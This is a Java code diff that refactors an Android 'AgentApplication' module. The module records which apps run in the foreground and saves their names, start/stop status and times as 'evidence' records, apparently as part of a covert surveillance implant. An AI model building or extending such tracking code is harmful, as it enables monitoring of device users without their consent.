@@ -10,6 +10,8 @@ import android.app.ActivityManager.RunningAppProcessInfo;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.LogR;
+import com.ht.RCSAndroidGUI.ProcessInfo;
+import com.ht.RCSAndroidGUI.ProcessStatus;
 import com.ht.RCSAndroidGUI.RunningProcesses;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
@@ -20,11 +22,8 @@ import com.ht.RCSAndroidGUI.util.DateTime;
 import com.ht.RCSAndroidGUI.util.Utils;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-public class AgentApplication extends AgentBase implements Observer<RunningProcesses> {
+public class AgentApplication extends AgentBase implements Observer<ProcessInfo> {
 	private static final String TAG = "AgentApplication";
-
-	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
-	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
 
 	@Override
 	public boolean parse(AgentConf conf) {
@@ -46,39 +45,12 @@ public class AgentApplication extends AgentBase implements Observer<RunningProce
 		ListenerProcess.self().detach(this);
 	}
 
-	public int notification(RunningProcesses processes) {
-		ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
-		if (list == null) {
-			return 0;
-		}
-		currentRunning.clear();
-
-		for (Iterator iterator = list.iterator(); iterator.hasNext();) {
-			RunningAppProcessInfo running = (RunningAppProcessInfo) iterator.next();
-			if (running.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
-
-				currentRunning.put(running.processName, running);
-				if (!lastRunning.containsKey(running.processName)) {
-					Log.d("QZ", TAG + " (notification): started " + running.processName);
-					saveEvidence(running, true);
-				} else {
-					lastRunning.remove(running.processName);
-				}
-			}
-		}
-
-		for (Iterator iter = lastRunning.keySet().iterator(); iter.hasNext();) {
-			RunningAppProcessInfo norun = (RunningAppProcessInfo) lastRunning.get(iter.next());
-			Log.d("QZ", TAG + " (notification): stopped " + norun.processName);
-			saveEvidence(norun, false);
-		}
-
-		lastRunning = new TreeMap<String, RunningAppProcessInfo>(currentRunning);
-
+	public int notification(ProcessInfo process) {
+		saveEvidence(process.processInfo, process.status);
 		return 0;
 	}
 
-	private void saveEvidence(RunningAppProcessInfo process, boolean starting) {
+	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
 		Check.requires(process != null, "null process");
 
 		String name = process.processName;
@@ -89,7 +61,7 @@ public class AgentApplication extends AgentBase implements Observer<RunningProce
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
 		items.add(tm);
 		items.add(WChar.getBytes(name, true));
-		items.add(WChar.getBytes(starting ? "START" : "STOP", true));
+		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
 		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
 
